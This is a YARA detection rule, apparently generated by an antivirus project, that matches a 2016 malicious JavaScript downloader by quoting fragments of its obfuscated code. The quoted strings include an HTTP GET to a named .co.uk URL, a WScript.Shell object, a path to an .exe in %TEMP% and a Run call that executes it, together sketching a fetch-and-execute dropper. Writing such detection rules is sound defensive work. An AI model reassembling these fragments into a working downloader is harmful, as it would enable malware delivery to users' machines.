rule sig_20160330_4241000c4b48093e22472ff41bb1479f {
  meta:
    description = "datamaliciousorder - file 20160330_4241000c4b48093e22472ff41bb1479f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b6e305cc31139e5c2ccda97bbe3a0c3187d924ee055343ccf36d776dae89730a"

  strings:
    $s1  = "_QH[_Q](\"GET\", \"http://srijanexportstowelwarmers.co.uk/k9owpa\", false);" fullword ascii
    $s2  = "var _YY = function _H() {return WScript[_S](\"WScript\"+\".Shell\");}(), _YN = 11;" fullword ascii
    $s3  = "function _V(_GI, _DL){_X0 = _X0 * 1; return _GI - _DL;};" fullword ascii
    $s4  = "if (_QH[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _CL(){return _B0 + \"\";};" fullword ascii
    $s6  = "function _KG() {return _YY[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"2UVGtRiEBI2oZZp.ex\" + \"e\";};" fullword ascii
    $s7  = "function _X() {return ((_R0 == true) && (_R0 == _S1)) ? 1 : _X0;};" fullword ascii
    $s8  = "function _DI(_E){_YY[\"Run\"](_E, _X0, _X0);};" fullword ascii
    $s9  = "function _O(){return 22;};" fullword ascii
    $s10 = "function _U()" fullword ascii
    $s11 = "function _GG(_IK) {var _AH = (1, 2, 3, 4, 5, _IK); return _AH;};" fullword ascii
    $s12 = " while (_VV){" fullword ascii
    $s13 = "function _YI(){return _S;};" fullword ascii
    $s14 = "return _V(_Z, _T);" fullword ascii
    $s15 = "var _SF = new this[\"Date\"]();" fullword ascii
    $s16 = "var _R0 = false;" fullword ascii
    $s17 = "_R0 = true; " fullword ascii
    $s18 = "var _S1 = false;" fullword ascii
    $s19 = "var _O0 = false;" fullword ascii
    $s20 = "_S1 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}